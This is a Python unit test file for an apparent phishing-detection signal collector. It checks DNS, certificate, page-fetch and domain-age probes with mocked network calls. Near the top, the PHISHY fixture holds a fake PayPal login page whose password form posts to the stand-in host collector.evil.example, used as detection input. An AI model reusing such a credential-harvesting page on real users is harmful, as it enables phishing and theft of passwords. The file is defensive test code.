import socket
import time
import unittest
from unittest import mock

import src.signals as signals
from src.signals import SignalConfig, collect_signals
from src.signals.netguard import BlockedTargetError, FetchError, FetchResult, NetworkPolicy
from src.validation import validate_url

PUBLIC = ["93.184.216.34"]
PHISHY = (b"<title>PayPal - Log in</title><form action='https://collector.evil.example/p'>"
          b"<input type=password></form>")


def page(body=PHISHY, final="https://paypal-login.example.net/"):
    return FetchResult(final_url=final, status=200, content_type="text/html", body=body,
                       truncated=False, redirect_chain=[])


def cfg(**kw):
    return SignalConfig(overall_timeout=kw.pop("overall_timeout", 3.0), request_timeout=1.0, **kw)


class SignalTests(unittest.TestCase):
    def patch(self, name, **kw):
        p = mock.patch.object(signals, name, **kw)
        m = p.start()
        self.addCleanup(p.stop)
        return m

    def patch_network(self, resolve=PUBLIC, cert=None, fetch=None, age=None, sb=None):
        return {
            "dns": self.patch("resolve_addresses", return_value=resolve) if not isinstance(resolve, Exception)
            else self.patch("resolve_addresses", side_effect=resolve),
            "cert": self.patch("check_certificate", return_value=cert or ({"status": "ok", "valid": True}, [])),
            "fetch": self.patch("fetch_page", return_value=fetch or page()),
            "age": self.patch("check_domain_age", return_value=age or ({"status": "ok", "age_days": 4000}, [])),
            "sb": self.patch("check_safe_browsing", return_value=sb or ({"status": "skipped"}, [])),
        }

    def test_without_deep_scan_nothing_touches_the_network(self):
        mocks = self.patch_network()
        out = collect_signals(validate_url("https://paypal-login.top/verify"), cfg(), deep_scan=False)
        for m in mocks.values():
            m.assert_not_called()
        self.assertFalse(out["deep_scan"])
        self.assertIsNone(out["dns"])
        self.assertIsNone(out["content"])
        self.assertEqual({f["code"] for f in out["flags"]}, {"brand_impersonation", "risky_tld"})

    def test_deep_scan_happy_path_merges_and_sorts_flags(self):
        young = ({"status": "ok", "age_days": 2}, [{"severity": "high", "code": "domain_very_new", "message": "m"}])
        self.patch_network(age=young)
        out = collect_signals(validate_url("https://paypal-login.example.net/signin"), cfg(), deep_scan=True)
        self.assertEqual(out["dns"], {"status": "ok", "resolves": True, "public": True, "addresses": PUBLIC})
        self.assertTrue(out["certificate"]["valid"])
        self.assertEqual(out["content"]["password_field_count"], 1)
        self.assertEqual(out["domain_age"]["age_days"], 2)
        severities = [f["severity"] for f in out["flags"]]
        self.assertEqual(severities, sorted(severities, key=["high", "warning", "info"].index))
        codes = {f["code"] for f in out["flags"]}
        self.assertTrue({"domain_very_new", "password_form_posts_off_domain", "brand_impersonation"} <= codes, codes)

    def test_unresolvable_domain_skips_dependent_checks(self):
        mocks = self.patch_network(resolve=socket.gaierror("nxdomain"))
        out = collect_signals(validate_url("https://no-such-domain.example/"), cfg(), deep_scan=True)
        self.assertEqual(out["dns"], {"status": "ok", "resolves": False})
        self.assertEqual(out["certificate"]["status"], "skipped")
        self.assertEqual(out["content"]["status"], "skipped")
        mocks["cert"].assert_not_called()
        mocks["fetch"].assert_not_called()
        self.assertIn("dns_unresolved", {f["code"] for f in out["flags"]})

    def test_private_address_is_not_contacted_or_revealed(self):
        mocks = self.patch_network(resolve=["10.0.0.5"])
        out = collect_signals(validate_url("https://innocent-looking.example/"), cfg(), deep_scan=True)
        self.assertEqual(out["dns"], {"status": "ok", "resolves": True, "public": False})
        self.assertNotIn("10.0.0.5", str(out))
        mocks["cert"].assert_not_called()
        mocks["fetch"].assert_not_called()
        self.assertIn("dns_non_public_address", {f["code"] for f in out["flags"]})

    def test_http_urls_skip_certificate_check(self):
        mocks = self.patch_network()
        out = collect_signals(validate_url("http://example.com/"), cfg(), deep_scan=True)
        self.assertEqual(out["certificate"]["status"], "skipped")
        mocks["cert"].assert_not_called()
        self.assertEqual(out["content"]["status"], "ok")

    def test_ip_hosts_skip_domain_age(self):
        mocks = self.patch_network()
        out = collect_signals(validate_url("http://93.184.216.34/login"), cfg(), deep_scan=True)
        self.assertEqual(out["domain_age"]["status"], "skipped")
        mocks["age"].assert_not_called()

    def test_one_failing_probe_does_not_sink_the_others(self):
        self.patch_network()
        self.patch("check_certificate", side_effect=RuntimeError("boom"))
        out = collect_signals(validate_url("https://example.com/"), cfg(), deep_scan=True)
        self.assertEqual(out["certificate"]["status"], "error")
        self.assertNotIn("boom", str(out))
        self.assertEqual(out["content"]["status"], "ok")

    def test_fetch_errors_are_reported_not_raised(self):
        for exc, status in ((BlockedTargetError("Port 22 is not allowed."), "blocked"), (FetchError("Too many redirects."), "error")):
            with self.subTest(status=status):
                self.patch_network()
                self.patch("fetch_page", side_effect=exc)
                out = collect_signals(validate_url("https://example.com/"), cfg(), deep_scan=True)
                self.assertEqual(out["content"]["status"], status)

    def test_slow_dns_hits_the_overall_deadline(self):
        self.patch_network()
        self.patch("resolve_addresses", side_effect=lambda *a: time.sleep(1.5) or PUBLIC)
        started = time.monotonic()
        out = collect_signals(validate_url("https://example.com/"), cfg(overall_timeout=0.3), deep_scan=True)
        self.assertLess(time.monotonic() - started, 1.2)
        self.assertEqual(out["dns"], {"status": "timeout"})
        self.assertEqual(out["content"]["status"], "skipped")

    def test_safe_browsing_key_is_passed_through(self):
        mocks = self.patch_network()
        collect_signals(validate_url("https://example.com/"), cfg(safe_browsing_api_key="K"), deep_scan=True)
        self.assertEqual(mocks["sb"].call_args.args[1], "K")

    def test_duplicate_flags_are_removed(self):
        dup = [{"severity": "info", "code": "x", "message": "same"}] * 2
        self.patch_network(cert=({"status": "ok", "valid": True}, dup))
        out = collect_signals(validate_url("https://example.com/"), cfg(), deep_scan=True)
        self.assertEqual([f["code"] for f in out["flags"]].count("x"), 1)


if __name__ == "__main__":
    unittest.main()
